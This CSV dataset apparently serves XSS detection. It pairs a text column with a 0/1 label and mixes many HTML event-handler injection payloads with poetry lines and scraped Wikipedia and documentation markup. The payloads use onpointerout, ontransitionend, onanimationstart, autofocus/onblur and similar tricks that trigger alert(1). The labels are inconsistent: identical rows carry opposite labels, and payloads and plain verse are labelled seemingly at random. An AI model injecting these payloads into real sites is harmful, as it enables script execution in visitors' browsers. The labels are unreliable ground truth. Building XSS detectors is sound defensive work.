text,label
document.documentURI,1
<meta onpointerout=alert(1)>XSS</meta>,1
<main id=x tabindex=1 onactivate=alert(1)></main>,0
"in a cup and writing this against death,",1
"Â Â Â Â Â Â Â Â Â Â Â  Noah,",0
with her greater power. When he visits the watering,0
<figcaption onpointerenter=alert(1)>XSS</figcaption>,1
but nervously. And a little bit curious. Even,0
<td onpointermove=alert(1)>XSS</td>,1
<span id=x tabindex=1 ondeactivate=alert(1)></span><input id=y autofocus>,0
"<br draggable=""true"" ondragleave=""alert(1)"">test</br>",1
the joy is in untying the string.,1
"<p draggable=""true"" ondragstart=""alert(1)"">test</p>",0
"<audio autoplay onloadedmetadata=alert(1)> <source src=""validaudio.wav"" type=""audio/wav""></audio>",1
wondering what the owl thought of this.,0
"<style>:target {color:red;}</style><fieldset id=x style=""transition:color 1s"" ontransitionend=alert(1)></fieldset>",1
<meta id=x tabindex=1 onfocus=alert(1)></meta>,1
"<style>@keyframes x{}</style><spacer style=""animation-name:x"" onanimationend=""alert(1)""></spacer>",1
"<ins onbeforecopy=""alert(1)"" contenteditable>test</ins>",1
Â,0
the apple or the rib,0
rehearsing her Anne Frank and pausing anxiously for,0
the moon is my librarythereâ€™s a glacier,0
A couple of men in uniform,0
"<li onbeforepaste=""alert(1)"" contenteditable>test</li>",1
"<output draggable=""true"" ondragstart=""alert(1)"">test</output>",0
"God says to the meek one, â€œOn Sunday mornings, have t",1
"<isindex ondblclick=""alert(1)"">test</isindex>",1
<bgsound id=x tabindex=1 onactivate=alert(1)></bgsound>,1
who loves themâ€‰â€”â€‰that there is someoneâ€‰â€”â€‰,0
I donâ€™t know why I waste,0
"untouching, entangled, sustained, free.",0
men tossed to the oceanâ€™s,1
<input4 onpointerdown=alert(1)>XSS</input4>,0
</ul>,0
"<style>:target {color: red;}</style><title id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></title>",0
for the public to take hold of!,0
scentless instructions. My mission is over.,0
"<h4><span class=""mw-headline"" id=""Robot_rights"">Robot rights",1
"<span id=""topics-index"">",1
"<li id=""cite_note-Decisions_theory_and_analysis-213""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Decisions_theory_and_analysis_213-0"">^ </a> </b>",1
"<tr draggable=""true"" ondrag=""alert(1)"">test</tr>",0
i am a stranger to this body,0
Had Azrael not seenÂ  Â  Â  in the hastily,0
"<style>:target {transform: rotate(180deg);}</style><slot id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></slot>",0
"<thead draggable=""true"" ondragenter=""alert(1)"">test</thead>",0
<tfoot onpointerout=alert(1)>XSS</tfoot>,1
"<li class=""toclevel-2 tocsection-34""><a href=""#Evaluating_progress""><span class=""tocnumber"">6.6",0
The heat.,0
<applet id=x tabindex=1 onactivate=alert(1)></applet>,1
"<div draggable=""true"" contenteditable>drag me</div><option ondrop=alert(1) contenteditable>drop here</option>",1
"<style>:target {transform: rotate(180deg);}</style><blockquote id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></blockquote>",0
"<li id=""cite_note-158""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-158"">^ </a> </b>",1
"<li><a href=""#CITEREFHutter2005"">Hutter 2005 </a>pp.&#160;125–126 </li> </ul>",1
<head id=x tabindex=1 onfocusin=alert(1)></head>,1
"<ol onkeyup=""alert(1)"" contenteditable>test</ol>",1
"Clytemnestraâ€™s scream, Draupadiâ€™s rage",1
you include something,0
"<video onkeypress=""alert(1)"" contenteditable>test</video>",1
"of slow dreams and lily-like parasols, in snaps",0
so you donâ€™t have to look at yourself. I saw,0
Later in Catalonia I danced the Sardanaâ€‰â€”â€‰,1
</span> </li>,1
"<del onclick=""alert(1)"">test</del>",1
"so be it, let us have magic. Let us have",1
"<colgroup onpaste=""alert(1)"" contenteditable>test</colgroup>",0
<image onpointerover=alert(1)>XSS</image>,1
</span>,1
"<listing onbeforepaste=""alert(1)"" contenteditable>test</listing>",0
"echo('IPT>alert("")</SCRIPT>')",0
"<bdo onbeforepaste=""alert(1)"" contenteditable>test</bdo>",0
there nonetheless. I studied them from a distance.,0
fluting for a lost future.,0
who had dark roots underneath her bleached curls?,0
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><caption id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></caption>",0
"and flew away from the boat, seeking a place",0
<figcaption onblur=alert(1) tabindex=1 id=x></figcaption><input autofocus>,1
with its artifacts of pregnancy & loss.,1
"<dt><a class=""reference internal"" href=""topics/commands.html""><span class=""doc"">Command line tool",1
<header id=x tabindex=1 onbeforeactivate=alert(1)></header>,0
"<strong onbeforepaste=""alert(1)"" contenteditable>test</strong>",1
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/media-pipeline.html"">Downloading and processing files and images</a></li>",0
"<datalist draggable=""true"" ondragend=""alert(1)"">test</datalist>",0
<audio id=x tabindex=1 ondeactivate=alert(1)></audio><input id=y autofocus>,0
"<dd onmouseover=""alert(1)"">test</dd>",0
"</TITLE><SCRIPT>alert("");</SCRIPT>",0
<u onpointerleave=alert(1)>XSS</u>,0
"</div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">Applied<br />computing </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0
The moon sees nothing of this. She is bald and wild,0
"â€” Oh, Eden! Oh, heeded ode!",0
<svg><div onload=alert(1)></div>,0
"<ol oncut=""alert(1)"" contenteditable>test</ol>",1
"Its every move a trial through chaos and the Pit,",1
"<tt onmouseout=""alert(1)"">test</tt>",0
"of will, the guitar echoes this, a chord,",1
"<style>:target {color:red;}</style><blink id=x style=""transition:color 1s"" ontransitionend=alert(1)></blink>",1
<sup onpointerover=alert(1)>XSS</sup>,1
<rb id=x tabindex=1 onbeforedeactivate=alert(1)></rb><input autofocus>,1
"<li><a href=""#CITEREFHutter2005"">Hutter 2005 </a>pp.&#160;125–126 </li> </ul>",0
"<dd onmouseenter=""alert(1)"">test</dd>",1
"<applet onmousedown=""alert(1)"">test</applet>",1
"<s oncontextmenu=""alert(1)"">test</s>",1
"not undangerous hound, complacency?",1
replies.,1
"<spacer onbeforecut=""alert(1)"" contenteditable>test</spacer>",0
Â,0
<wbr onblur=alert(1) tabindex=1 id=x></wbr><input autofocus>,1
"in the bucket, my father standing at the gate,",1
"At Lathmar Holi, would you ever stop laughing then?",1
"<param onbeforecut=""alert(1)"" contenteditable>test</param>",0
"<article oncut=""alert(1)"" contenteditable>test</article>",0
"or first dwells in, before it navigates",1
<svg><div onload=alert(1)></div>,1
<picture id=x tabindex=1 onbeforedeactivate=alert(1)></picture><input autofocus>,0
"<button draggable=""true"" ondragstart=""alert(1)"">test</button>",0
"<tbody onbeforepaste=""alert(1)"" contenteditable>test</tbody>",0
not even a woven palm frond. Just You and me.,0
"<td draggable=""true"" ondragend=""alert(1)"">test</td>",0
"<style>@keyframes x{}</style><hgroup style=""animation-name:x"" onanimationend=""alert(1)""></hgroup>",1
the tumult of memories he had to bear?,1
"<strike onkeyup=""alert(1)"" contenteditable>test</strike>",0
Unheard in the transition. Thus do we,0
one Â  Â  Â  O Terrible God of the Mechanical Age I am,1
"<li class=""wy-breadcrumbs-aside"">",1
"<menuitem oncontextmenu=""alert(1)"">test</menuitem>",0
"<spacer onmouseup=""alert(1)"">test</spacer>",0
the apple or the rib,1
<source onfocusout=alert(1) tabindex=1 id=x></source><input autofocus>,1
<svg><discard onbegin=alert(1)>,1
"<p onmouseenter=""alert(1)"">test</p>",1
The body they do not compete can,0
"The Heir. Once, after",1
something in the handholding and,1
&#x00003C,0
"over fallow pastures his crows patrolled,",0
"<section data-toggle=""wy-nav-shift"" class=""wy-nav-content-wrap"">",1
"<li onkeydown=""alert(1)"" contenteditable>test</li>",1
"<label draggable=""true"" ondragleave=""alert(1)"">test</label>",0
No one knows if it was simply a matter of mixed,1
"</div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">Applied<br />computing </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",1
<sub id=x tabindex=1 ondeactivate=alert(1)></sub><input id=y autofocus>,1
Discussion:,1
"<area onbeforecopy=""alert(1)"" contenteditable>test</area>",1
"<noembed onkeyup=""alert(1)"" contenteditable>test</noembed>",1
attempt to dress in a sporty way (whoâ€™s,0
"<dt><a class=""reference internal"" href=""topics/architecture.html""><span class=""doc"">Architecture overview",1
Â,1
"<rt onmousemove=""alert(1)"">test</rt>",1
"<li class=""toclevel-3 tocsection-17""><a href=""#Cognitive_simulation""><span class=""tocnumber"">5.2.1",1
"<div draggable=""true"" contenteditable>drag me</div><content ondragover=alert(1) contenteditable>drop here</content>",0
<acronym onpointerleave=alert(1)>XSS</acronym>,0
Â,1
2.,0
"<li id=""cite_note-320""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-320"">^ </a> </b>",1
"in time, but Eva stayed, a loss.",1
"Was it humility, to feel so honoured?",0
The carnation,1
Before he knew the wordÂ  Â  Â  clouds was the last word,1
"<label draggable=""true"" ondrag=""alert(1)"">test</label>",0
on my own. Organize a large party. Hire,0
"my breath with its curry and accent,",1
"<hgroup onmouseover=""alert(1)"">test</hgroup>",0
});,1
<set onpointerdown=alert(1)>XSS</set>,1
"<rt draggable=""true"" ondragend=""alert(1)"">test</rt>",0
who circles the perimeter,1
brighter and harsher and more intoxicating,1
"<aside onbeforecopy=""alert(1)"" contenteditable>test</aside>",0
"<audio onmousedown=""alert(1)"">test</audio>",0
"<video oncontextmenu=""alert(1)"">test</video>",0
<input onpointerup=alert(1)>XSS</input>,1
Praise the going home,1
"document.getElementsByName("")",1
dered why he had been given gifts even God,1
<svg onpointerout=alert(1)>XSS</svg>,1
<marquee onpointermove=alert(1)>XSS</marquee>,0
"a heavy rain, drops spill from",0
<content onpointerup=alert(1)>XSS</content>,1
"I got myself inside, and closed the hatch.",1
</span> </h4>,1
<fieldset onpointerout=alert(1)>XSS</fieldset>,1
The light of Heaven cast on common things.,0
"who nestled the Coptic Bible to their ribs, would",0
</span> </h3>,0
curdled belly,1
<svg><video onload=alert(1)></video>,0
is hard and choked with juice like a plastic,1
"By the salt of your corruption, and the tears",0
"for each other and the world, find their way",0
<address onpointermove=alert(1)>XSS</address>,0
point: the same paradise,1
he was our favorite,1
"Of cymballed fountains hidden in the dale,",1
"<noscript onmouseover=""alert(1)"">test</noscript>",1
That is no country for old men. The young,0
"<div draggable=""true"" contenteditable>drag me</div><tfoot ondrop=alert(1) contenteditable>drop here</tfoot>",1
<shadow onpointerup=alert(1)>XSS</shadow>,1
</span> </li>,0
<dfn onpointermove=alert(1)>XSS</dfn>,1
</span> </h4>,1
</span></code></a>-powered libraries.</dd>,1
"<base onkeypress=""alert(1)"" contenteditable>test</base>",1
i.,1
"<bdi draggable=""true"" ondragenter=""alert(1)"">test</bdi>",1
"<strong onkeypress=""alert(1)"" contenteditable>test</strong>",1
<thead onpointerup=alert(1)>XSS</thead>,1
"<li id=""cite_note-299""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-299"">^ </a> </b>",1
hidden room,0
"<li id=""cite_note-AI_in_2000s-13""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-AI_in_2000s_13-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-AI_in_2000s_13-1""><sup><i><b>b </b> </i> </sup> </a> <a href=""#cite_ref-AI_in_2000s_13-2""><sup><i><b>c </b> </i> </sup> </a>",0
"<dl draggable=""true"" ondrag=""alert(1)"">test</dl>",1
<em onblur=alert(1) tabindex=1 id=x></em><input autofocus>,0
They remember our having remembered.,0
"<video oncopy=""alert(1)"" contenteditable>test</video>",1
no sense of territory,0
"<element draggable=""true"" ondragleave=""alert(1)"">test</element>",1
incredibly graceful despite his or her mood.,1
"Just like a gladiola, its true flower",0
</span>,1
"<colgroup onmousedown=""alert(1)"">test</colgroup>",0
no longer has and privileges,0
his stomach upset. Heads all bent.,0
Â,0
"<style>:target {color:red;}</style><var id=x style=""transition:color 1s"" ontransitionend=alert(1)></var>",1
"Ninurta of the Silence, and there also",0
<progress id=x tabindex=1 onfocus=alert(1)></progress>,0
"<style>@keyframes x{}</style><head style=""animation-name:x"" onanimationstart=""alert(1)""></head>",1
"<style>:target {transform: rotate(180deg);}</style><main id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></main>",0
"<li id=""cite_note-Stochastic_temporal_models-211""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-Stochastic_temporal_models_211-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-Stochastic_temporal_models_211-1""><sup><i><b>b </b> </i> </sup> </a> <a href=""#cite_ref-Stochastic_temporal_models_211-2""><sup><i><b>c </b> </i> </sup> </a>",1
"<footer oncontextmenu=""alert(1)"">test</footer>",0
"<div class=""version"">",1
or the slaughterhouse.,0
<small onfocusout=alert(1) tabindex=1 id=x></small><input autofocus>,1
From his ploughing fields and his sweat,0
burning with no smoke,0
"<svg draggable=""true"" ondragend=""alert(1)"">test</svg>",1
B: You never told me you were Jewish.,0
"<style>@keyframes slidein {}</style><main style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></main>",0
"who sits, while I muse, on my right shoulder and who",1
To be dressed in clothes others wish you to wear,1
</span> </li>,1
"<style>@keyframes x{}</style><time style=""animation-name:x"" onanimationstart=""alert(1)""></time>",1
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  unaccountably,0
"<address onmouseout=""alert(1)"">test</address>",0
<abbr onblur=alert(1) tabindex=1 id=x></abbr><input autofocus>,0
You may want to know why.,0
"<style>:target {color: red;}</style><marquee id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></marquee>",0
"<style>@keyframes x{}</style><bdi style=""animation-name:x"" onanimationstart=""alert(1)""></bdi>",1
"All-knowing Rimat-Ninsun spoke to him,",0
"of a warm wind, plumed with love and things like lov",1
In my motherland people pray to the crosses of flyin,1
"<blink draggable=""true"" ondragenter=""alert(1)"">test</blink>",1
<br id=x tabindex=1 onbeforedeactivate=alert(1)></br><input autofocus>,1
"<isindex onclick=""alert(1)"">test</isindex>",0
and then slowly slowly,1
"<li><a href=""/wiki/Ubiquitous_robot"" title=""Ubiquitous robot"">Ubiquitous </a> </li> </ul>",1
"any truth, and so published a memoir later",1
"After Hieronymus Bosch, â€œThe Garden of Earthly Delight",1
"<fieldset onbeforepaste=""alert(1)"" contenteditable>test</fieldset>",1
"in the shadow of the rainfall,",0
"<BR SIZE=""&{alert('')}"">",1
<animatetransform onpointermove=alert(1)>XSS</animatetransform>,1
"<style>@keyframes x{}</style><strike style=""animation-name:x"" onanimationstart=""alert(1)""></strike>",0
"<image onmouseover=""alert(1)"">test</image>",1
"Wherein she, to be both sacrum & wristâ€”",1
<image2 onpointerdown=alert(1)>XSS</image2>,0
"<form oncut=""alert(1)"" contenteditable>test</form>",0
"Of ox and luncheon tongue, six hundred pounds;",0
"the tenants, the good Negroes down in the village,",1
"<p onpaste=""alert(1)"" contenteditable>test</p>",1
<ruby onpointerout=alert(1)>XSS</ruby>,1
Under your sheathed paw,0
"<area draggable=""true"" ondragend=""alert(1)"">test</area>",1
"among sounds, unhearable, bang away,",0
"<style>:target {transform: rotate(180deg);}</style><blockquote id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></blockquote>",1
Inside the receiver I hear crackle,1
"<address onbeforecut=""alert(1)"" contenteditable>test</address>",0
we forgot how to be thirsty,0
"<cite ondblclick=""alert(1)"">test</cite>",0
"<figure draggable=""true"" ondragstart=""alert(1)"">test</figure>",0
"<basefont onkeyup=""alert(1)"" contenteditable>test</basefont>",0
<shadow id=x tabindex=1 onbeforeactivate=alert(1)></shadow>,0
<dl onblur=alert(1) tabindex=1 id=x></dl><input autofocus>,1
</span>,1
"I donâ€™t explain to Sophiaâ€™s mom,",0
Nothing gets futured without its own spitshine,0
"<colgroup onmousemove=""alert(1)"">test</colgroup>",0
for them & for me & yourself & the polisâ€‰â€”â€‰,0
Is the one I fear there with her train,0
"<nextid onmouseenter=""alert(1)"">test</nextid>",0
static noise to us down here. i noticed,0
"<strong onmouseleave=""alert(1)"">test</strong>",1
VII.,0
"<li><a href=""/wiki/Interactive_evolutionary_computation"" title=""Interactive evolutionary computation"">Interactive evolutionary computation </a> </li> </ul>",1
</span> </li>,1
"<tfoot onmouseleave=""alert(1)"">test</tfoot>",1
</span> </li>,1
"The boy is parenthesis,",0
<body onblur=alert(1) id=x><iframe id=x>,0
"<rtc oncut=""alert(1)"" contenteditable>test</rtc>",1
"to be ignored. My grandfather, back hunched",0
Cannot perform but men easily accomplish.,0
your mouth open & the tattered Crombie.,0
<template onblur=alert(1) tabindex=1 id=x></template><input autofocus>,1
Rain-cracked and wind-straddled.,1
"<style>@keyframes x{}</style><abbr style=""animation-name:x"" onanimationend=""alert(1)""></abbr>",0
"<p class=""caption""><span class=""caption-text"">Basic concepts",1
"and like that time, we learn it by its lack.",1
"<tt onmouseup=""alert(1)"">test</tt>",1
"<style>:target {color: red;}</style><script id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></script>",1
uncertain,1
we knew,0
But I have them convinced I will show them something,1
must get back.,1
So we hit it off right away,1
"unearthly music, such as sailors",1
"<span oncut=""alert(1)"" contenteditable>test</span>",0
Â  birds perched on a crooked branch,1
"<style>:target {color: red;}</style><cite id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></cite>",0
"<li><a href=""/wiki/Substance_dualism"" class=""mw-redirect"" title=""Substance dualism"">Substance dualism </a> </li> </ul>",0
"<style>@keyframes x{}</style><aside style=""animation-name:x"" onanimationend=""alert(1)""></aside>",1
restless and unwilling. It formulates inside me like,1
"</tr><tr><td style=""text-align:right;font-size:115%"">",0
<strike id=x tabindex=1 onbeforeactivate=alert(1)></strike>,0
"<div draggable=""true"" contenteditable>drag me</div><tbody ondragover=alert(1) contenteditable>drop here</tbody>",0
<q onblur=alert(1) tabindex=1 id=x></q><input autofocus>,1
that we may learn,0
"<head onpaste=""alert(1)"" contenteditable>test</head>",0
"<audio controls autoplay onended=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",1
<rb onpointermove=alert(1)>XSS</rb>,1
"<input type=""hidden"" name=""area"" value=""default"" />",1
"<ol ondblclick=""alert(1)"">test</ol>",1
7,1
"<audio onmouseenter=""alert(1)"">test</audio>",1
five six days,0
onFocus(),1
like monsoon water. You swivel your sightless head.,1
"for its little feet to alight, and finding none,",1
"shimmer. Still nothing new to say about the creek, h",0
<details id=x tabindex=1 onbeforeactivate=alert(1)></details>,1
<track onpointerup=alert(1)>XSS</track>,0
From the sun and saw instead the warm rain tearing,0
The dreams that were when Arcady began,0
"<base draggable=""true"" ondragend=""alert(1)"">test</base>",0
"And the rest doubled up between, his head",0
like a child again in her star-apple kingdom.,1
Â,0
"<th onkeypress=""alert(1)"" contenteditable>test</th>",1
"<rtc ondblclick=""alert(1)"">test</rtc>",0
"<area onbeforepaste=""alert(1)"" contenteditable>test</area>",1
in one pan of the balance scale,0
Description is what has been taken away,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><small id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></small>",1
6.,0
<dialog onpointerover=alert(1)>XSS</dialog>,0
<ol id=x tabindex=1 onbeforedeactivate=alert(1)></ol><input autofocus>,1
Port Royal perished in a cataclysmic earthquake.,1
the walls gentle as blue flames they curl into,0
for no reason,0
<canvas onpointerup=alert(1)>XSS</canvas>,0
"<style>:target {color: red;}</style><dl id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></dl>",1
<param id=x tabindex=1 onbeforedeactivate=alert(1)></param><input autofocus>,0
"<noscript onmouseup=""alert(1)"">test</noscript>",1
"<picture onkeyup=""alert(1)"" contenteditable>test</picture>",1
You belong in the books I read,1
